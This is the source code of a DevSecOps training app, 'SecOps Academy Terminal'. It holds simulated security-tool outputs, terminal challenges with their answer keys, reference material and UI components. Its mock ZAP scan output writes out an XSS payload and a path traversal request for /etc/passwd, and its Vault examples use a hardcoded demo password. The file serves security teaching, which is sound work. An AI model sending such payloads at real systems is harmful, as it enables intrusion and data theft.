  'zap-baseline.py -t http://localhost:3000': 'OWASP ZAP Baseline Scan\n========================\nTarget: http://localhost:3000\n\nPassive scanning...\n\nWARN-NEW: X-Frame-Options Header Not Set [10020] x 3\n\thttp://localhost:3000\n\thttp://localhost:3000/#/login\n\thttp://localhost:3000/#/register\nWARN-NEW: Missing Anti-clickjacking Header [10020] x 3\nWARN-NEW: Server Leaks Version Information via "Server" Header [10036] x 2\nWARN-NEW: Content-Type Header Missing [10019] x 1\nWARN-NEW: Cookie No HttpOnly Flag [10010] x 4\n\nFAIL-NEW: 0\tWARN-NEW: 5\tINFO: 2\tIGNORE: 0\tPASS: 42',
  'zap-full-scan.py -t http://localhost:3000 -m 5': 'OWASP ZAP Full Scan\n====================\nTarget: http://localhost:3000\nMax duration: 5 minutes\n\nSpider scan... found 47 URLs\nActive scanning...\n\nFAIL-NEW: SQL Injection [40018] x 2\n\thttp://localhost:3000/rest/products/search?q=test\n\thttp://localhost:3000/rest/user/login\nFAIL-NEW: Cross Site Scripting (Reflected) [40012] x 1\n\thttp://localhost:3000/#/search?q=<script>alert(1)</script>\nFAIL-NEW: Path Traversal [6] x 1\n\thttp://localhost:3000/rest/products/../../../etc/passwd\n\nWARN-NEW: 8\nINFO: 5\tPASS: 38\n\nFAIL-NEW: 3\tWARN-NEW: 8\tINFO: 5\tPASS: 38',
  'zap-api-scan.py -t api-spec.yaml -f openapi': 'OWASP ZAP API Scan\n====================\nUsing OpenAPI spec: api-spec.yaml\n\nEndpoints discovered: 12\nRequests sent: 156\n\nFAIL-NEW: SQL Injection - SQLite [40024] x 1\n\tPOST http://localhost:3000/api/Users\nWARN-NEW: Content Security Policy Header Not Set [10038] x 4\nWARN-NEW: Insufficient Anti-CSRF Tokens [10202] x 2\nWARN-NEW: Missing Security Headers [10015] x 2\n\nFAIL-NEW: 1\tWARN-NEW: 4\tINFO: 3\tPASS: 28',
  'vault status': 'Key             Value\n---             -----\nSeal Type       shamir\nInitialized     true\nSealed          false\nTotal Shares    1\nThreshold       1\nVersion         1.15.4\nBuild Date      2024-12-01T00:00:00Z\nStorage Type    inmem\nCluster Name    vault-cluster-abc123\nCluster ID      def456-ghi789-jkl012\nHA Enabled      false',
  'vault kv put secret/db password=SuperSecret123': '====== Secret Path ======\nsecret/data/db\n\n======= Metadata =======\nKey                Value\n---                -----\ncreated_time       2026-03-22T10:30:00.000Z\ncustom_metadata    <nil>\ndeletion_time      n/a\ndestroyed          false\nversion            1',
  'vault kv get secret/db': '====== Secret Path ======\nsecret/data/db\n\n======= Metadata =======\nKey                Value\n---                -----\ncreated_time       2026-03-22T10:30:00.000Z\ncustom_metadata    <nil>\ndeletion_time      n/a\ndestroyed          false\nversion            1\n\n====== Data ======\nKey         Value\n---         -----\npassword    SuperSecret123',
  'vault kv get -field=password secret/db': 'SuperSecret123',
  'vault kv get -format=json secret/db': '{\n  "request_id": "abc-123-def-456",\n  "lease_id": "",\n  "lease_duration": 0,\n  "renewable": false,\n  "data": {\n    "data": {\n      "password": "SuperSecret123"\n    },\n    "metadata": {\n      "created_time": "2026-03-22T10:30:00.000Z",\n      "version": 1\n    }\n  }\n}',
  'vault policy write app-readonly policy.hcl': 'Success! Uploaded policy: app-readonly',
  'vault policy list': 'app-readonly\ndefault\nroot',
  'vault auth enable approle': 'Success! Enabled approle auth method at: approle/',
  'kubectl get pods': 'NAME                          READY   STATUS    RESTARTS   AGE\njuice-shop-6d4b8c7f9-x2k4m   1/1     Running   0          12m',
  'kubectl get nodes': 'NAME                         STATUS   ROLES           AGE    VERSION\nsecops-lab-control-plane     Ready    control-plane   15m    v1.29.1',
  'kubectl cluster-info': 'Kubernetes control plane is running at https://127.0.0.1:6443\nCoreDNS is running at https://127.0.0.1:6443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy\n\nTo further debug and diagnose cluster problems, use \'kubectl cluster-info dump\'.',
  'kubectl apply -f deployment.yaml': 'deployment.apps/juice-shop created\nservice/juice-shop created',
  "opa eval --input input.json --data policy.rego 'data.kubernetes.admission.deny' --format pretty": '[\n  "Container \'evil-app\' uses unapproved image \'ubuntu:latest\'. Approved: [python:3.12-slim, node:20-slim, nginx:1.25, alpine:3.19]",\n  "Container \'evil-app\' runs as root (UID 0)",\n  "Container \'evil-app\' is privileged"\n]',
  'opa version': 'Version: 0.62.0\nBuild Commit: abc123def456\nBuild Timestamp: 2024-12-01T00:00:00Z\nBuild Hostname: builder-01\nGo Version: go1.21.5\nPlatform: darwin/arm64\nWebAssembly: available',
  'help': '╔══════════════════════════════════════════════════════════════╗\n║                  SecOps Academy Terminal                      ║\n╠══════════════════════════════════════════════════════════════╣\n║                                                              ║\n║  DOCKER          docker --version, ps, ps -a, images,        ║\n║                  build, run, logs, stop                       ║\n║                                                              ║\n║  SECRETS         gitleaks detect/protect/version              ║\n║                  trufflehog filesystem/git/--version          ║\n║                                                              ║\n║  SAST            semgrep scan (auto/security-audit/           ║\n║                  owasp-top-ten/custom/json/sarif)             ║\n║                                                              ║\n║  SCA             trivy fs/image (vuln/severity/format)        ║\n║                  grype (scan/--only-fixed/json)               ║\n║                                                              ║\n║  CONTAINERS      hadolint (lint/json/config)                  ║\n║                  trivy config                                 ║\n║                                                              ║\n║  DAST            zap-baseline.py, zap-full-scan.py,           ║\n║                  zap-api-scan.py                              ║\n║                                                              ║\n║  IAC             checkov (-d/-f/--framework)                  ║\n║                                                              ║\n║  VAULT           vault status/kv put/kv get/policy/auth       ║\n║                                                              ║\n║  KUBERNETES      kubectl get pods/nodes/cluster-info/apply    ║\n║                                                              ║\n║  OPA             opa eval/version                             ║\n║                                                              ║\n║  META            help, clear, whoami                          ║\n║                                                              ║\n║  56 commands total. Type any command to see output.           ║\n╚══════════════════════════════════════════════════════════════╝',
  'whoami': '__DYNAMIC__',
  'clear': '__CLEAR__',
};

// ============================================================================
// DATA: TERMINAL CHALLENGES (15)
// ============================================================================
const TERMINAL_CHALLENGES = [
  { id: 1, objective: 'Scan the current directory for hardcoded secrets', answer: 'gitleaks detect -v', hint: 'Use the secrets detection tool with verbose output', explanation: 'Gitleaks scans files for patterns matching known secret types (API keys, passwords, tokens).' },
  { id: 2, objective: 'Find CRITICAL vulnerabilities in the nginx:latest container image', answer: 'trivy image --severity CRITICAL nginx:latest', hint: 'Use a container scanner with severity filtering', explanation: 'Trivy with --severity CRITICAL filters results to show only the most dangerous vulnerabilities.' },
  { id: 3, objective: 'Run a SAST scan using OWASP Top 10 rules', answer: 'semgrep scan --config "p/owasp-top-ten"', hint: 'Use a SAST tool with a specific ruleset targeting web app risks', explanation: 'Semgrep with the owasp-top-ten config focuses on the most critical web application security risks.' },
  { id: 4, objective: 'Lint a Dockerfile for security best practices', answer: 'hadolint Dockerfile', hint: 'Use the Dockerfile linting tool', explanation: 'Hadolint checks Dockerfiles against best practices (DL rules) and shell script issues (SC rules).' },
  { id: 5, objective: 'Scan Terraform files for infrastructure misconfigurations', answer: 'checkov -d .', hint: 'Use an IaC scanning tool on the current directory', explanation: 'Checkov scans Terraform, CloudFormation, K8s, and other IaC files for security misconfigurations.' },
  { id: 6, objective: 'Store a database password securely in Vault', answer: 'vault kv put secret/db password=SuperSecret123', hint: 'Use the secrets manager to store a key-value pair', explanation: 'Vault stores secrets encrypted, with audit logging and access control policies.' },
  { id: 7, objective: 'Run a passive web security scan against a target at localhost:3000', answer: 'zap-baseline.py -t http://localhost:3000', hint: 'Use the DAST tool for a baseline (passive) scan', explanation: 'ZAP baseline scan performs passive scanning — observing responses without active attacks.' },
  { id: 8, objective: 'List all running Docker containers', answer: 'docker ps', hint: 'Use the container management tool to list running containers', explanation: 'docker ps shows all currently running containers with their status, ports, and names.' },
  { id: 9, objective: 'Check git commit history for leaked credentials', answer: 'trufflehog git file://. --json', hint: 'Use a secrets scanner that can check git history', explanation: 'TruffleHog scans git history commit by commit, finding secrets that were committed and later deleted.' },
  { id: 10, objective: 'Generate a Software Bill of Materials in CycloneDX format', answer: 'trivy fs . --format cyclonedx -o sbom.json', hint: 'Use a scanner to generate an SBOM in a specific format', explanation: 'Trivy generates SBOMs listing all components (dependencies, OS packages) in CycloneDX or SPDX format.' },
  { id: 11, objective: 'Check if your Vault server is running and unsealed', answer: 'vault status', hint: 'Use the secrets manager status command', explanation: 'vault status shows initialization state, seal status, version, and cluster information.' },
  { id: 12, objective: 'Retrieve a stored secret from Vault', answer: 'vault kv get secret/db', hint: 'Use the key-value get command', explanation: 'vault kv get retrieves the secret data and metadata from the specified path.' },
  { id: 13, objective: 'Scan a Kubernetes YAML manifest for security issues', answer: 'checkov -f k8s.yaml', hint: 'Use an IaC scanner targeting a specific file', explanation: 'Checkov checks K8s manifests for privileged containers, root users, missing limits, and more.' },
  { id: 14, objective: 'Run a comprehensive Semgrep security audit', answer: 'semgrep scan --config "p/security-audit"', hint: 'Use SAST with the most comprehensive security ruleset', explanation: 'The security-audit ruleset includes 312 rules covering a wide range of security patterns.' },
  { id: 15, objective: 'List all pods running in your Kubernetes cluster', answer: 'kubectl get pods', hint: 'Use the Kubernetes CLI to list pods', explanation: 'kubectl get pods shows all pods in the current namespace with their status and readiness.' },
];

// ============================================================================
// DATA: INTEL REFERENCE
// ============================================================================
const INTEL_TOOLS = [
  {
    name: 'Secrets Detection',
    tools: 'Gitleaks & TruffleHog',
    commands: [
      { cmd: 'gitleaks detect -v', desc: 'Scan current directory for secrets' },
      { cmd: 'gitleaks detect --report-format json --report-path report.json', desc: 'Generate JSON report' },
      { cmd: 'gitleaks protect --staged -v', desc: 'Pre-commit hook scan' },
      { cmd: 'trufflehog filesystem . --json', desc: 'Scan filesystem for secrets' },
      { cmd: 'trufflehog git file://. --json', desc: 'Scan git history for secrets' },
    ],
  },
  {
    name: 'SAST',
    tools: 'Semgrep',
    commands: [
      { cmd: 'semgrep scan --config auto', desc: 'Auto-detect language & rules' },
      { cmd: 'semgrep scan --config "p/security-audit"', desc: 'Comprehensive security audit (312 rules)' },
      { cmd: 'semgrep scan --config "p/owasp-top-ten"', desc: 'OWASP Top 10 focused scan' },
      { cmd: 'semgrep scan --config auto --json -o report.json', desc: 'JSON output for CI integration' },
      { cmd: 'semgrep scan --config auto --sarif -o report.sarif', desc: 'SARIF output for GitHub integration' },
      { cmd: 'semgrep scan --config custom-rules.yaml target.py', desc: 'Run custom rules' },
    ],
  },
  {
    name: 'SCA',
    tools: 'Trivy & Grype',
    commands: [
      { cmd: 'trivy fs . --scanners vuln', desc: 'Scan filesystem dependencies' },
      { cmd: 'trivy fs . --scanners vuln --severity HIGH,CRITICAL', desc: 'Filter by severity' },
      { cmd: 'grype .', desc: 'Scan with Grype' },
      { cmd: 'grype . --only-fixed', desc: 'Show only fixable vulnerabilities' },
      { cmd: 'grype . -o json > report.json', desc: 'JSON output' },
    ],
  },
  {
    name: 'Container Security',
    tools: 'Trivy & Hadolint',
    commands: [
      { cmd: 'trivy image nginx:latest', desc: 'Full container image scan' },
      { cmd: 'trivy image --severity CRITICAL nginx:latest', desc: 'Critical vulns only' },
      { cmd: 'trivy image --vuln-type os nginx:latest', desc: 'OS package vulns only' },
      { cmd: 'hadolint Dockerfile', desc: 'Lint Dockerfile' },
      { cmd: 'hadolint --format json Dockerfile', desc: 'JSON output' },
    ],
  },
  {
    name: 'DAST',
    tools: 'OWASP ZAP',
    commands: [
      { cmd: 'zap-baseline.py -t http://target:port', desc: 'Passive baseline scan' },
      { cmd: 'zap-full-scan.py -t http://target:port -m 5', desc: 'Full active scan (5 min)' },
      { cmd: 'zap-api-scan.py -t api-spec.yaml -f openapi', desc: 'API scan with OpenAPI spec' },
    ],
  },
  {
    name: 'IaC Scanning',
    tools: 'Checkov',
    commands: [
      { cmd: 'checkov -d .', desc: 'Scan current directory' },
      { cmd: 'checkov -d terraform/', desc: 'Scan Terraform directory' },
      { cmd: 'checkov -f k8s.yaml', desc: 'Scan specific file' },
      { cmd: 'checkov -f k8s.yaml --framework kubernetes', desc: 'Specify framework' },
    ],
  },
  {
    name: 'CI/CD',
    tools: 'Jenkins, GitLab CI, GitHub Actions',
    commands: [
      { cmd: 'Jenkinsfile', desc: 'pipeline { agent any; stages { stage("Scan") { steps { sh "gitleaks detect" } } } }' },
      { cmd: '.gitlab-ci.yml', desc: 'include: template:Security/SAST.gitlab-ci.yml' },
      { cmd: '.github/workflows/security.yml', desc: 'uses: aquasecurity/trivy-action@master' },
    ],
  },
  {
    name: 'Secrets Management',
    tools: 'HashiCorp Vault',
    commands: [
      { cmd: 'vault status', desc: 'Check server status' },
      { cmd: 'vault kv put secret/path key=value', desc: 'Store a secret' },
      { cmd: 'vault kv get secret/path', desc: 'Retrieve a secret' },
      { cmd: 'vault kv get -field=key secret/path', desc: 'Get specific field' },
      { cmd: 'vault policy write name policy.hcl', desc: 'Create access policy' },
      { cmd: 'vault auth enable approle', desc: 'Enable AppRole auth' },
    ],
  },
  {
    name: 'Kubernetes',
    tools: 'kubectl & Kind',
    commands: [
      { cmd: 'kubectl get pods', desc: 'List pods' },
      { cmd: 'kubectl get nodes', desc: 'List nodes' },
      { cmd: 'kubectl apply -f manifest.yaml', desc: 'Apply configuration' },
      { cmd: 'kubectl cluster-info', desc: 'Cluster information' },
      { cmd: 'kind create cluster --name lab', desc: 'Create local cluster' },
    ],
  },
  {
    name: 'Policy as Code',
    tools: 'OPA & Conftest',
    commands: [
      { cmd: "opa eval --input input.json --data policy.rego 'data.pkg.deny'", desc: 'Evaluate policy' },
      { cmd: 'opa version', desc: 'Check OPA version' },
      { cmd: 'conftest test Dockerfile --policy policy/', desc: 'Test config with Conftest' },
    ],
  },
];

const INTEL_COMPARISON_SAST = {
  headers: ['Aspect', 'SAST', 'DAST', 'SCA', 'IAST'],
  rows: [
    ['Tests', 'Source code', 'Running app', 'Dependencies', 'Instrumented runtime'],
    ['When', 'Build time', 'After deploy', 'Build time', 'During testing'],
    ['Finds', 'Code-level vulns', 'Runtime vulns', 'Known CVEs', 'Runtime + code context'],
    ['Strengths', 'Full code coverage', 'Real-world testing', 'Supply chain coverage', 'Low false positives'],
    ['Weaknesses', 'False positives', "Can't see code", 'Only known vulns', 'Requires instrumentation'],
  ],
};

const INTEL_COMPARISON_CICD = {
  headers: ['Aspect', 'Jenkins', 'GitLab CI', 'GitHub Actions'],
  rows: [
    ['Config', 'Jenkinsfile (Groovy)', '.gitlab-ci.yml', '.github/workflows/*.yml'],
    ['Hosting', 'Self-hosted', 'SaaS or self-hosted', 'SaaS + self-hosted runners'],
    ['Security', 'Plugins + Docker', 'Built-in templates', 'Marketplace actions'],
    ['Strengths', 'Most flexible', 'All-in-one platform', 'Huge ecosystem'],
    ['Best for', 'Enterprise, custom', 'GitLab-native teams', 'GitHub repos, open source'],
  ],
};

const INTEL_FRAMEWORKS = [
  { name: 'OWASP Top 10 (2025)', desc: 'The ten most critical web application security risks. Updated in 2025 to reflect modern threats including supply chain risks and AI security. Covers Broken Access Control, Injection, Cryptographic Failures, and more.' },
  { name: 'OWASP DevSecOps Guideline', desc: 'Best practices for integrating security into every stage of the DevOps lifecycle, from pre-commit to production monitoring.' },
  { name: 'NIST SSDF (SP 800-218)', desc: 'Secure Software Development Framework — recommended practices for organizations to prepare, protect, produce secure software, and respond to vulnerabilities.' },
  { name: 'SLSA', desc: 'Supply-chain Levels for Software Artifacts — a framework for ensuring build integrity, from L0 (no guarantees) to L3 (hardened platform with non-falsifiable provenance).' },
  { name: 'CIS Benchmarks', desc: 'Detailed configuration security guidelines for Docker, Kubernetes, AWS, Azure, GCP, Linux, and more. Automated with tools like kube-bench and Docker Bench.' },
  { name: 'MITRE ATT&CK', desc: 'Knowledge base of real-world adversary tactics and techniques: Initial Access, Execution, Persistence, Privilege Escalation, Lateral Movement, Exfiltration, and more.' },
];

const INTEL_INTERVIEW_QUICK = [
  { q: 'What is DevSecOps?', a: 'DevOps + security at every stage. Culture + automation, not just tools.' },
  { q: 'Explain Shift Left', a: 'Move security earlier: IDE → pre-commit → CI. Bugs cost 100x more in production.' },
  { q: 'SAST vs DAST vs SCA?', a: 'SAST=code, DAST=running app, SCA=dependencies. Each catches different things.' },
  { q: 'Measure DevSecOps success?', a: 'MTTR by severity, scan coverage %, false positive rate, developer adoption.' },
  { q: 'Policy as Code?', a: 'Security rules as executable code (OPA/Rego). Version-controlled, auto-enforced.' },
  { q: 'Design a pipeline?', a: 'Secrets → SAST/SCA → Image scan → DAST → Policy gate → Prod + monitoring.' },
  { q: 'Critical CVE in prod?', a: 'Assess exploitability → scope → patch → deploy through pipeline → postmortem.' },
  { q: 'Choose tools?', a: 'Coverage, FP rate, language support, CI integration, speed, cost, community.' },
  { q: 'Secrets in CI/CD?', a: 'Never in code. Vault/KMS → runtime injection → short-lived tokens → rotate.' },
  { q: 'False positives?', a: 'Tune rules, allowlists, severity filter, track FP rate, custom org rules.' },
  { q: '"Security slows us down"?', a: 'Fast scans, IDE plugins, show value, only block critical. Empathize first.' },
  { q: 'No security culture?', a: 'Start small, security champions, lunch-and-learns, gamify, gradual enforcement.' },
  { q: 'Prioritize 500 findings?', a: 'Severity × exploitability × exposure × fix availability. Critical-external first.' },
  { q: 'Security vs deadline?', a: 'Risk assessment, compensating controls, documented exception with fix timeline.' },
  { q: 'Stay current?', a: 'NVD feeds, GitHub advisories, communities, tool lists, periodic reassessment.' },
  { q: 'SBOM importance?', a: 'Full inventory for vuln tracking. Required by EO 14028. CycloneDX or SPDX.' },
  { q: 'Supply chain defense?', a: 'Pin deps, verify checksums, SBOM, sign images, SLSA build provenance.' },
  { q: 'K8s security basics?', a: '4C model, Pod Security Standards, RBAC, NetworkPolicies, admission control.' },
  { q: 'Incident response?', a: 'Detect → Contain → Eradicate → Recover → Post-incident. Contain first!' },
  { q: 'Runtime security?', a: 'Falco for syscall monitoring, seccomp, AppArmor, centralized logging, alerts.' },
];

// ============================================================================
// DATA: LABS LIST (for Labs screen)
// ============================================================================
const LABS_LIST = [
  { id: 'lab-1.4', moduleId: '1.4', title: 'Your First Container', difficulty: 'beginner', tools: ['Docker'], category: 'Container', time: '15 min' },
  { id: 'lab-1.5', moduleId: '1.5', title: 'Secure the Dockerfile', difficulty: 'beginner', tools: ['Docker', 'Hadolint'], category: 'Container', time: '20 min' },
  { id: 'lab-1.6', moduleId: '1.6', title: 'Git Security Setup', difficulty: 'beginner', tools: ['Git'], category: 'Secrets', time: '15 min' },
  { id: 'lab-2.1', moduleId: '2.1', title: 'Hunt the Secrets', difficulty: 'beginner', tools: ['Gitleaks', 'TruffleHog'], category: 'Secrets', time: '25 min' },
  { id: 'lab-2.2', moduleId: '2.2', title: 'Find the Vulnerabilities', difficulty: 'intermediate', tools: ['Semgrep'], category: 'SAST', time: '20 min' },
  { id: 'lab-2.3', moduleId: '2.3', title: 'Audit the Dependencies', difficulty: 'intermediate', tools: ['Trivy', 'Grype'], category: 'SCA', time: '20 min' },
  { id: 'lab-2.4', moduleId: '2.4', title: 'Scan Before Deploy', difficulty: 'intermediate', tools: ['Trivy', 'Hadolint'], category: 'Container', time: '25 min' },
  { id: 'lab-2.5', moduleId: '2.5', title: 'Attack the Running App', difficulty: 'intermediate', tools: ['ZAP'], category: 'DAST', time: '30 min' },
  { id: 'lab-2.6', moduleId: '2.6', title: 'Catch the Misconfigs', difficulty: 'intermediate', tools: ['Checkov', 'KICS'], category: 'IaC', time: '25 min' },
  { id: 'lab-3.1', moduleId: '3.1', title: 'Build Your First Pipeline', difficulty: 'intermediate', tools: ['Jenkins'], category: 'CI/CD', time: '30 min' },
  { id: 'lab-3.2', moduleId: '3.2', title: 'Secure the Pipeline', difficulty: 'intermediate', tools: ['Jenkins', 'Gitleaks', 'Semgrep', 'Trivy'], category: 'CI/CD', time: '35 min' },
  { id: 'lab-3.3', moduleId: '3.3', title: 'GitLab Security Pipeline', difficulty: 'intermediate', tools: ['GitLab CI'], category: 'CI/CD', time: '25 min' },
  { id: 'lab-3.4', moduleId: '3.4', title: 'GitHub Actions Workflow', difficulty: 'intermediate', tools: ['GitHub Actions'], category: 'CI/CD', time: '20 min' },
  { id: 'lab-3.5', moduleId: '3.5', title: 'Full Pipeline Design', difficulty: 'intermediate', tools: ['Docker Compose', 'All Tools'], category: 'CI/CD', time: '40 min' },
  { id: 'lab-4.1', moduleId: '4.1', title: 'Vault Operations', difficulty: 'advanced', tools: ['Vault'], category: 'Secrets Mgmt', time: '30 min' },
  { id: 'lab-4.2', moduleId: '4.2', title: 'Lock Down Kubernetes', difficulty: 'advanced', tools: ['Kind', 'kubectl', 'kubeaudit'], category: 'K8s', time: '40 min' },
  { id: 'lab-4.3', moduleId: '4.3', title: 'Write Security Policies', difficulty: 'advanced', tools: ['OPA', 'Rego'], category: 'Policy', time: '25 min' },
  { id: 'lab-4.4', moduleId: '4.4', title: 'Code Quality Analysis', difficulty: 'advanced', tools: ['SonarQube'], category: 'SAST', time: '30 min' },
  { id: 'lab-4.5', moduleId: '4.5', title: 'Secure the Supply Chain', difficulty: 'advanced', tools: ['Trivy SBOM'], category: 'Supply Chain', time: '20 min' },
];

// ============================================================================
// DESIGN TOKENS
// ============================================================================
let DT = {
  bg: '#09090B', surface: '#18181B', surfaceRaised: '#27272A',
  border: '#27272A', borderSubtle: '#3F3F46',
  textPrimary: '#FAFAFA', textSecondary: '#A1A1AA', textTertiary: '#71717A',
  blue: '#3B82F6', blueMuted: 'rgba(59,130,246,0.1)',
  purple: '#A78BFA', purpleMuted: 'rgba(167,139,250,0.1)',
  amber: '#F59E0B', amberMuted: 'rgba(245,158,11,0.1)',
  success: '#22C55E', successMuted: 'rgba(34,197,94,0.1)',
  error: '#EF4444', errorMuted: 'rgba(239,68,68,0.1)',
  termGreen: '#4ADE80', termBg: '#0C0C0C',
};

const THEMES = {
  dark: {
    bg: '#09090B', surface: '#18181B', surfaceRaised: '#27272A',
    border: '#27272A', borderSubtle: '#3F3F46',
    textPrimary: '#FAFAFA', textSecondary: '#A1A1AA', textTertiary: '#71717A',
    blue: '#3B82F6', blueMuted: 'rgba(59,130,246,0.1)',
    purple: '#A78BFA', purpleMuted: 'rgba(167,139,250,0.1)',
    amber: '#F59E0B', amberMuted: 'rgba(245,158,11,0.1)',
    success: '#22C55E', successMuted: 'rgba(34,197,94,0.1)',
    error: '#EF4444', errorMuted: 'rgba(239,68,68,0.1)',
    termGreen: '#4ADE80', termBg: '#0C0C0C',
  },
  light: {
    bg: '#FFFFFF', surface: '#F4F4F5', surfaceRaised: '#E4E4E7',
    border: '#D4D4D8', borderSubtle: '#A1A1AA',
    textPrimary: '#09090B', textSecondary: '#3F3F46', textTertiary: '#71717A',
    blue: '#2563EB', blueMuted: 'rgba(37,99,235,0.08)',
    purple: '#7C3AED', purpleMuted: 'rgba(124,58,237,0.08)',
    amber: '#D97706', amberMuted: 'rgba(217,119,6,0.08)',
    success: '#16A34A', successMuted: 'rgba(22,163,74,0.08)',
    error: '#DC2626', errorMuted: 'rgba(220,38,38,0.08)',
    termGreen: '#16A34A', termBg: '#1E1E1E',
  }
};

const CALLOUT_VARIANTS = {
  'key-concept': { color: DT.purple, bg: DT.purpleMuted, icon: Brain, label: 'Key Concept' },
  'tip': { color: DT.success, bg: DT.successMuted, icon: Zap, label: 'Tip' },
  'warning': { color: DT.amber, bg: DT.amberMuted, icon: AlertTriangle, label: 'Important' },
  'example': { color: DT.blue, bg: DT.blueMuted, icon: BookOpen, label: 'Real-World Example' },
};

// ============================================================================
// RICH CONTENT BLOCK RENDERERS
// ============================================================================
function TextBlock({ content }) {
  return <p className="text-[#A1A1AA] text-[15px] leading-[1.7]">{content}</p>;
}

function CalloutBlock({ variant = 'tip', title, content }) {
  const v = CALLOUT_VARIANTS[variant] || CALLOUT_VARIANTS.tip;
  const Icon = v.icon;
  return (
    <div className="rounded-xl p-5 flex gap-4" style={{ background: v.bg, borderLeft: `3px solid ${v.color}` }}>
      <Icon size={20} style={{ color: v.color, flexShrink: 0, marginTop: 2 }} />
      <div>
        <div className="text-xs font-semibold uppercase tracking-wider mb-1" style={{ color: v.color }}>{title || v.label}</div>
        <div className="text-[#FAFAFA] text-sm leading-relaxed">{content}</div>
      </div>
    </div>
  );
}

function TimelineBlock({ items }) {
  return (
    <div className="relative flex flex-col gap-0">
      {items.map((item, i) => (
        <div key={i} className="flex gap-4 relative pb-6">
          <div className="flex flex-col items-center">
            <div className="w-10 h-10 rounded-full flex items-center justify-center text-xs font-bold border-2 shrink-0" style={{ borderColor: DT.blue, color: DT.blue, background: DT.blueMuted }}>
              {item.year?.slice(-2) || (i + 1)}
            </div>
            {i < items.length - 1 && <div className="w-0.5 flex-1 mt-1" style={{ background: DT.border }} />}
          </div>
          <div className="pt-1.5 pb-2">
            <div className="text-[#FAFAFA] font-semibold text-sm">{item.label} {item.year && <span className="text-[#71717A] font-normal text-xs ml-1">({item.year})</span>}</div>
            <div className="text-[#A1A1AA] text-sm mt-1 leading-relaxed">{item.desc}</div>
          </div>
        </div>
      ))}
    </div>
  );
}

function CostChartBlock({ items }) {
  const max = Math.max(...items.map(i => i.multiplier));
  return (
    <div className="rounded-xl p-5" style={{ background: DT.surface }}>
      <div className="text-xs font-semibold uppercase tracking-wider text-[#71717A] mb-4">Cost of Fixing Bugs</div>
      <div className="space-y-3">
        {items.map((item, i) => (
          <div key={i} className="flex items-center gap-3">
            <div className="w-24 text-sm text-[#A1A1AA] shrink-0">{item.stage}</div>
            <div className="flex-1 h-7 rounded-md overflow-hidden" style={{ background: DT.surfaceRaised }}>
              <div className="h-full rounded-md flex items-center px-3 transition-all" style={{ width: `${Math.max((Math.log10(item.multiplier + 1) / Math.log10(max + 1)) * 100, 12)}%`, background: item.color + '22', borderLeft: `3px solid ${item.color}` }}>
                <span className="text-xs font-bold" style={{ color: item.color }}>{item.multiplier}x</span>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function ComparisonBlock({ items }) {
  return (
    <div className={`grid gap-4 ${items.length === 3 ? 'grid-cols-1 md:grid-cols-3' : 'grid-cols-1 md:grid-cols-2'}`}>
      {items.map((item, i) => (
        <div key={i} className="rounded-xl p-5" style={{ background: DT.surface, borderTop: `3px solid ${item.color}` }}>
          <div className="font-semibold text-sm mb-3" style={{ color: item.color }}>{item.title}</div>
          <ul className="space-y-2">
            {item.points.map((p, j) => (
              <li key={j} className="flex gap-2 text-sm text-[#A1A1AA] leading-relaxed">
                <CheckCircle size={14} className="shrink-0 mt-1" style={{ color: item.color }} />
                {p}
              </li>
            ))}
          </ul>
        </div>
      ))}
    </div>
  );
}

function PipelineBlock({ stages }) {
  return (
    <div className="rounded-xl p-6 overflow-x-auto" style={{ background: DT.surface }}>
      <div className="flex items-stretch gap-0 min-w-max">
        {stages.map((stage, i) => (
          <React.Fragment key={i}>
            <div className="flex flex-col items-center" style={{ minWidth: 100 }}>
              <div className="relative w-full">
                <div className={`mx-auto w-16 h-16 rounded-2xl flex items-center justify-center text-lg ${stage.security ? 'ring-2 ring-offset-2 ring-offset-[#18181B]' : ''}`} style={{ background: stage.security ? DT.successMuted : DT.surfaceRaised, border: `1px solid ${stage.security ? DT.success : DT.border}`, ...(stage.security ? { ringColor: DT.success } : {}) }}>
                  {stage.icon || stage.label.slice(0, 2)}
                </div>
                {stage.security && (
                  <div className="absolute -top-1 -right-1 w-5 h-5 rounded-full flex items-center justify-center text-[10px]" style={{ background: DT.success, color: '#fff' }}>
                    <Shield size={10} />
                  </div>
                )}
              </div>
              <div className="text-xs font-semibold mt-2 text-center" style={{ color: DT.textPrimary }}>{stage.label}</div>
              {stage.tool && <div className="text-[10px] mt-0.5 text-center px-1.5 py-0.5 rounded-full" style={{ background: DT.blueMuted, color: DT.blue }}>{stage.tool}</div>}
              {stage.desc && <div className="text-[10px] mt-0.5 text-center" style={{ color: DT.textTertiary }}>{stage.desc}</div>}
            </div>
            {i < stages.length - 1 && (
              <div className="flex items-center px-1 pt-2">
                <div className="w-6 h-0.5 rounded" style={{ background: stage.security ? DT.success : DT.borderSubtle }} />
                <ArrowRight size={12} style={{ color: stage.security ? DT.success : DT.borderSubtle }} />
              </div>
            )}
          </React.Fragment>
        ))}
      </div>
    </div>
  );
}

function ScanOutputBlock({ title, tool, findings }) {
  return (
    <div className="rounded-xl overflow-hidden" style={{ border: `1px solid ${DT.border}` }}>
      <div className="flex items-center gap-2 px-4 py-2" style={{ background: DT.surfaceRaised }}>
        <div className="flex gap-1.5">
          <div className="w-3 h-3 rounded-full bg-[#EF4444]" />
          <div className="w-3 h-3 rounded-full bg-[#F59E0B]" />
          <div className="w-3 h-3 rounded-full bg-[#22C55E]" />
        </div>
        <span className="text-xs font-mono ml-2" style={{ color: DT.textTertiary }}>{tool || 'terminal'}</span>
        {title && <span className="text-xs ml-auto" style={{ color: DT.textTertiary }}>{title}</span>}
      </div>
      <div className="p-4 font-mono text-xs leading-relaxed" style={{ background: DT.termBg }}>
        {findings.map((f, i) => (
          <div key={i} className="mb-2">
            {f.type === 'header' && <div style={{ color: DT.textTertiary }}>{f.text}</div>}
            {f.type === 'finding' && (
              <div className="flex items-start gap-2">
                <span className="shrink-0 px-1.5 py-0.5 rounded text-[10px] font-bold" style={{
                  background: f.severity === 'CRITICAL' ? DT.errorMuted : f.severity === 'HIGH' ? 'rgba(249,115,22,0.1)' : f.severity === 'MEDIUM' ? DT.amberMuted : DT.blueMuted,
                  color: f.severity === 'CRITICAL' ? DT.error : f.severity === 'HIGH' ? '#F97316' : f.severity === 'MEDIUM' ? DT.amber : DT.blue,
                }}>{f.severity}</span>
                <div>
                  <span style={{ color: '#D4D4D8' }}>{f.text}</span>
                  {f.file && <span style={{ color: DT.textTertiary }}> — {f.file}</span>}
                </div>
              </div>
            )}
